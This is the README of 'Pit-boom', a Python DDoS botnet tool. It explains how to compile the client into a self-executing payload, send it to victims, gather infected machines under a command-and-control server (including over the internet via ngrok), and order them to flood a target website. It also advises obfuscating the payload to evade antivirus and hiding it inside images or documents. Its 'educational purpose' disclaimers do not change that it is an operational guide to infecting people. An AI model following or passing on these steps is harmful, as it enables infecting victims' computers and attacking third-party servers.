# Pit-boom


  Pit-boom is a simple DDOS botnet which can flood a web server using its infected computers (zombies)

  It can also work on WAN, you only need portmap.io or Ngrok server which can be used to do portforwading 

  And be able to infect computers that are not on your same network

  This botnet has both a server and client file

  The server side script is obfuscated with variable enc while the client side script is not

  Just compile the client file using pyinstaller, this will be easier to make your payload self executable

  Without having your victim to install any python dependencies


  I wont be responsible for the illegal use of this tool....



# Command


 git clone https://github.com/Gbolahanomostosho/Pit-boom



 cd Pit-boom



 unzip pitboom.zip



 cd pitboom



 pip3 install -r requirements.txt




 python3 Pit-boom-server.py



# How to use

 If you are performing the attack on LAN:


 In line 34 on the pit-boom client script change the ip address your local ip address which is "127.0.0.1" by default or your private ip address and change your port 
 on line 44, 77 and line 101 default port is "4445" on the client script..


 Then compile the script using pyinstaller or you can leave the script like that but compilation with pyinstaller to make it self executable is more better this will
 make the victim run the payload without installing any dependency..


 Then send the payload to your victim after compilation, the more pc you infect the more zombies you will have for carrying out more attack with the bots
 you can infect as much as you can with this payload..


 Then just start the "python3 Pit-boom-server.py" and enter the server ip address and port which you have added on your client side script 
 and wait to get a reverse shell connection and wait for your bot to connect to your CnC server if your bots are online
 you can have several client/victim like i said before, no need to refresh, your bots will auto connect to the CnC whenever they come online.....



 Then enter "help" to show list of commands 



 To order your zombies to perform DDOS attack on a targeted website command is "attack example.com 5000 700"
 dont forget to change that example.com to victim sit name.com dont add http or https to it, only the host name.com and that 5000 is the number of request 
 you may change the number if you like and that 700 is the number of threads, you can also change the number of threads if you like


 To show list of connected bots/zombies (infected pc) which is online your command is "listbots"


 To exit bot from the CnC server and close all connections with your bots your command is "exit"


 This is for LAN attack (for target on the same wifi network)












 If you are performing the attack on WAN:


 You will need an Ngrok server, do a small research on it 


 Start your Ngrok server and enter the ip address and port given to you by the ngrok server on the client script same process for lan
 and ensure you dont close your ngrok server 


 I will advise you to go for the premium ngrok server plan to maintain persistent connection incase you restart your pc the server ip may have change on free plan
 if you want to input it on your CnC after restarting

 
 Then after going through the process and compilation and sending to victim outside LAN


 Just start the "python3 Pit-boom-server.py" and enter the ngrok server ip address and port which you have added on your client side script 
 and wait to get a bot handshake connection from the infected pc and wait for your bot to connect to your CnC server if your bots are online
 you can have several client/victim like i said before, the more victim you have, the more massive your attack will be...
 
 
 Then enter 'help" to show list of commands 

 
 To order your zombies to perform DDOS attack on a targeted website command is "attack example.com 5000 700"
 dont forget to change that example.com to victim sit name.com dont add http or https to it, only the host name.com and that 5000 is the number of request per seconds
 you may change the number if you like and that 700 is the number of threads, you can also change the number of threads if you like...



 To show list of connected bots/zombies (infected pc) which is online your command is "listbots"


 To exit bot from the CnC server and close all connections with your bots your command is "exit"


 This is for WAN attack (for target on the over the internet) using Ngrok


 And if you want to use portmap.io for portforwarding and to make it work over the internet (WAN) too


 I will recommend you to research on it... 



# Extra notice :

 If you want your payload to bypass antivirus i will advise you to obfuscate the payload you can do more research on obfuscation and how it works
 pyinstaller can also be use to obfuscate your malware after compilation..



 And also if you want to inject the payload inside an image like .png, .jpg or .pdf file or .doc file,
 i will advise you to make use of stenganography and how it works or do more research on malware binder, you can also make use of exiftool..
 


 Obfuscating your malware will make it bypass antivirus and injecting it into an harmless file is more an added advantage to completely evade antivirus and 
 make your payload easier when sending it to your victim..


 Infact go learn more on cryptography and how the encryption chain works and how u can use algorithm like AES, RSA to bind your malware into an harmless looking file
 i am talking about window malware now.....







# tested on :


- Linux


- Windows 





# Not yet tested on :



- Termux




# Disclaimers:



  I wont be responsible for any action you performed with this botnet


  For educational and ethical purpose only


  Pls dont attack gov or edu site with it or point the tool at the server you do not own or control....



# Disclaimers in Sha512 :


   7b346870e47d71d965c0b396b72bb0242fb2b1c328885e08de9481425ab3b6fbc3d38b5aaa340e541c5d4ebbb6ced8fca5a1df131304aac25c2fdffb69ced489



   9b4459e3bad0cf812ff237a2304a2079d66363ee474d9f53a4f0733a9237afb330ad12700bf37874aad625e3e4875d0e07cb2a1d5aeb497361940c6e8bf013c0



   a971bed2a0f9a130c0df5c8d740152747398a076cc3b9224558bec2f6cb1e02b7a1fdc1db9c2bd7cac047b1182a767a14938215a69c03fd4974e78add5371414

